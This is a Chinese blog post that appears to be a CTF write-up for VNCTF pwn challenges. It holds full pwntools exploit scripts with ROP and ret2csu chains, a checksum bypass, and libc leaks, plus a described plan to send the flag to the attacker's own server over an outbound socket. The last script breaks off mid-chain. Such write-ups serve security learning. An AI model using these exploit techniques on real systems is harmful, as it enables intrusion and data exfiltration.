<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="vnctfclear_got刚开始泄露libc地址算基地址猜版本号本地能打通，远程不行，看了wp发现用了csu,自己复现时发现call [r12+rbx*8]这段代码不好搞，wp也很巧妙，使用了bss上面的一个地址（能读的也只有bss段，是我疏忽了，思路挺好想到的），最后我的脚本 12345678910111213141516171819202122232425262728293031323334">
<meta property="og:type" content="article">
<meta property="og:title" content="VNCTF">
<meta property="og:url" content="http://example.com/2022/03/02/VNCTF/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="vnctfclear_got刚开始泄露libc地址算基地址猜版本号本地能打通，远程不行，看了wp发现用了csu,自己复现时发现call [r12+rbx*8]这段代码不好搞，wp也很巧妙，使用了bss上面的一个地址（能读的也只有bss段，是我疏忽了，思路挺好想到的），最后我的脚本 12345678910111213141516171819202122232425262728293031323334">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-03-02T12:18:05.000Z">
<meta property="article:modified_time" content="2022-03-02T12:18:35.323Z">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/03/02/VNCTF/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>VNCTF | study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/VNCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          VNCTF
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 20:18:05 / 修改时间：20:18:35" itemprop="dateCreated datePublished" datetime="2022-03-02T20:18:05+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="vnctf"><a href="#vnctf" class="headerlink" title="vnctf"></a>vnctf</h1><h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><p>刚开始泄露libc地址算基地址猜版本号本地能打通，远程不行，看了wp发现用了csu,自己复现时发现<code>call [r12+rbx*8]</code>这段代码不好搞，wp也很巧妙，使用了bss上面的一个地址（能读的也只有bss段，是我疏忽了，思路挺好想到的），最后我的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,26251)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x400762&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///&#x27;</span>)</span><br><span class="line">    syscall_addr=<span class="number">0x000000000040077e</span></span><br><span class="line">    bss_addr=<span class="number">0x601000</span></span><br><span class="line">    gadget1=<span class="number">0x4007EA</span></span><br><span class="line">    gadget2=<span class="number">0x4007D0</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(gadget1)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(<span class="number">0x600e40</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0x3b</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(syscall_addr)</span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    m=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)</span><br><span class="line">    m=m.ljust(<span class="number">0x3b</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    sh.send(m)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#flag&#123;0f3a2cff-55bb-4517-a7f9-d91daf946d32&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>tcp服务的模拟，他会检查上传的tcp报文的格式，传数据的时候得绕过这个检查，然后会把传上来的数据拷贝到栈上，造成了栈溢出，远程环境很容易崩，多试几次，这也是我比赛期间内唯一做出来的题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28714</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">main_addr=<span class="number">0x401A5E</span></span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000401bb3: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401bb1: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">0x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000032b5a: pop rsp; ret;</span></span><br><span class="line"><span class="string">0x0000000000043ae8: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000001b96: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x00000000000d2745: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000003960: pop rsp; ret; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401bb3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401bb1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sumbit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Which?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v5_again</span>(<span class="params">v5,string</span>):</span></span><br><span class="line">    i=<span class="built_in">len</span>(string)</span><br><span class="line">    m=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(m&lt;=i-<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> m==<span class="number">16</span>:</span><br><span class="line">            m+=<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s=<span class="built_in">ord</span>(string[m])+(<span class="built_in">ord</span>(string[m+<span class="number">1</span>])&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        v5=v5^s</span><br><span class="line">        m+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> v5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_context</span>(<span class="params">v6,i,context</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    tcp_message=p16(<span class="number">0x766e</span>) <span class="comment">#0</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0x28b7</span>) <span class="comment">#2</span></span><br><span class="line">    tcp_message+=p32(v6) <span class="comment">#4</span></span><br><span class="line">    tcp_message+=p32(<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">    tcp_message+=p16(i) <span class="comment">#12</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0</span>) <span class="comment">#18</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0xffff</span>)<span class="comment">#22</span></span><br><span class="line">    tcp_message+=context</span><br><span class="line">    tcp_message=tcp_message.ljust(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    v5=get_v5_again(<span class="number">0x140b</span>,tcp_message)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(v5)</span><br><span class="line">    real_tcp_message=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tcp_message)):</span><br><span class="line">        <span class="keyword">if</span> i ==<span class="number">16</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>(v5&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">17</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>((v5&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        real_tcp_message+=tcp_message[i]</span><br><span class="line">    sleep(<span class="number">7</span>)</span><br><span class="line">    sh.send(real_tcp_message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x401A5D&#x27;)</span></span><br><span class="line">    v5=<span class="number">5131</span></span><br><span class="line">    tcp_context(<span class="number">1</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)+p64(main_addr)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">    pop_rsp=libc_base+<span class="number">0x0000000000032b5a</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rsp)+p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi_r15)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h2><p>第一次遇见<code>close(0);close(1);close(2)</code>,以为没啥，就普通的orw,结果发现自己的read根本写不上去，查了下才发现关闭了标准输入输出，所以无法再和程序交互，无法交互我一下就想起了侧信道，但是试过发现本地可以远程还是不行，咨询了学长才明白，远程关闭了标准输入输出流即远程题目的socket也就断了，所以无法判断程序的状态了，后来研究了学长的wp和官网wp稍微搞懂了一点。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在远程使用<code>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</code>起一个socket客户端服务，然后使用connect连接我方服务器<code>connect(soc, (struct sockaddr *)&amp;serv_addr, sizeof(struct sockaddr_in))</code>，然后<code>write(socketfd,flag_addr.size)</code>,把flag传到我方服务器上面。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process([&#x27;./ld.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27264</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dump of assembler code for function backDoor:</span></span><br><span class="line"><span class="string">   0x0000000000401349 &lt;+0&gt;:	endbr64 </span></span><br><span class="line"><span class="string">   0x000000000040134d &lt;+4&gt;:	push   rbp</span></span><br><span class="line"><span class="string">   0x000000000040134e &lt;+5&gt;:	mov    rbp,rsp</span></span><br><span class="line"><span class="string">   0x0000000000401351 &lt;+8&gt;:	syscall </span></span><br><span class="line"><span class="string">   0x0000000000401353 &lt;+10&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401354 &lt;+11&gt;:	pop    rdx</span></span><br><span class="line"><span class="string">   0x0000000000401355 &lt;+12&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401356 &lt;+13&gt;:	pop    rdi</span></span><br><span class="line"><span class="string">   0x0000000000401357 &lt;+14&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401358 &lt;+15&gt;:	pop    rsi</span></span><br><span class="line"><span class="string">   0x0000000000401359 &lt;+16&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135a &lt;+17&gt;:	pop    rax</span></span><br><span class="line"><span class="string">   0x000000000040135b &lt;+18&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135c &lt;+19&gt;:	push   rax</span></span><br><span class="line"><span class="string">   0x000000000040135d &lt;+20&gt;:	pop    rcx</span></span><br><span class="line"><span class="string">   0x000000000040135e &lt;+21&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135f &lt;+22&gt;:	mov    rdi,rcx</span></span><br><span class="line"><span class="string">   0x0000000000401362 &lt;+25&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401363 &lt;+26&gt;:	nop</span></span><br><span class="line"><span class="string">   0x0000000000401364 &lt;+27&gt;:	pop    rbp</span></span><br><span class="line"><span class="string">   0x0000000000401365 &lt;+28&gt;:	ret    </span></span><br><span class="line"><span class="string">End of assembler dump.</span></span><br><span class="line"><span class="string">0x0000000000401347: leave; ret;</span></span><br><span class="line"><span class="string">0x0000000000401014: call rax;</span></span><br><span class="line"><span class="string">0x000000000040116C                 jmp     rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">socket_addr=<span class="number">0x403700</span>+<span class="number">0x1a0</span></span><br><span class="line">flag_addr=<span class="number">0x403700</span>+<span class="number">0x1b0</span></span><br><span class="line">target=<span class="number">0x403700</span>+<span class="number">0x1c0</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pop_rax=<span class="number">0x000000000040135a</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401356</span></span><br><span class="line">    pop_rsi=<span class="number">0x0000000000401358</span></span><br><span class="line">    pop_rdx=<span class="number">0x0000000000401354</span></span><br><span class="line">    syscall_ret=<span class="number">0x0000000000401351</span></span><br><span class="line">    leave_ret=<span class="number">0x0000000000401347</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    